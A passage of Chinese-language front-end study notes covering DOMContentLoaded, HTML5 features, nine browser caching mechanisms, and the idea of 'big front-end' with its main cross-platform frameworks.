三、会影响页面的并行加载。

并行加载：同一时间对同一域名下的加载数量是有限制的：

MDN解析：当初始HTML文档已完全加载和解析时，将触发DOMContentLoaded事件，而不需要等待样式表，图像和子框架页面加载（事件可以用来检测HTML页面是否完全加载完毕(fully-loaded)）。





## h5新特性

1. 新的选择器：document.querySelector,document.querySelestorAll
2. 拖拽释放Api：Drag,Drop
3. 存储：sessionStorage,localStorage
4. 媒体元素 video audio
5. 页面间通信：postMessage
6. 历史：history
7. 全双工通信webSocket
8. 语义化标签
9. 绘画canvas

## 浏览器9种缓存方式

1. Http缓存：是基于Http协议的浏览器缓存方式
2. webSql：只有较高版本的Chrome浏览器支持
3. indexDB：是一个为了在客户端存储可观数量的结构化数据，并在这些数据上进行高性能索引的Api
4. Cookie：通常是网站为了辨别用户身份进行Session存储
5. Localstorage：Html5新增的一种本地缓存方案，一般用于存储数据，加快下次渲染速度
6. sessionStorage：与localstorage类似，页面关闭就会销毁
7. application cache：将大部分js，css，图片等静态资源放在manifast文件配置中
8. cacheStorage :serverWorker规范中定义的
9. flash缓存：主要基于flash有读写浏览器端本地目录的功能



## **大前端是什么？**

简单来说，大前端就是所有前端的统称，比如Android、iOS、web、Watch等，最接近用户的那一层也就是UI层，然后将其统一起来，就是大前端。大前端最大的特点在于一次开发，同时适用于所有平台，开发者不用为一个APP需要做Android和iOS两种模式而担心。大前端是web统一的时代，利用web不仅能开发出网站，更可以开发手机端web应用和移动端应用程序。

**大前端为什么出现？**

由于node的出现，前端工程师不需要依赖于后端程序而直接运行，从而前后端分离起来。所以当开发一个新产品的时候服务只需要写一次，但是面向用户的产品可能有很多，例如网站、Android客户端、iOS客户端和微信小程序等。由于各个平台使用的技术栈都不一样，代码无法复用，非常浪费人力、物力。那么有没有什么技术能够解决这一痛点呢？大前端应运而生，其实大前端的主要核心就是跨平台技术，有了跨平台技术，各个平台的差异性就抹平了，开发者只需要一套技术栈就可以开发出适用于多个平台的客户端。

**跨平台方案简介**

目前的主流跨平台方案：Cordova/phoneGap、React Native、Weex、微信小程序、PWA和Flutter等，根据其原理性，可以分为三大类。

H5+原生（Cordova、Ionic、微信小程序）
JavaScript开发+原生渲染 （React Native、Weex、快应用）
自绘UI+原生(Flutter)
增强版Web App(PWA)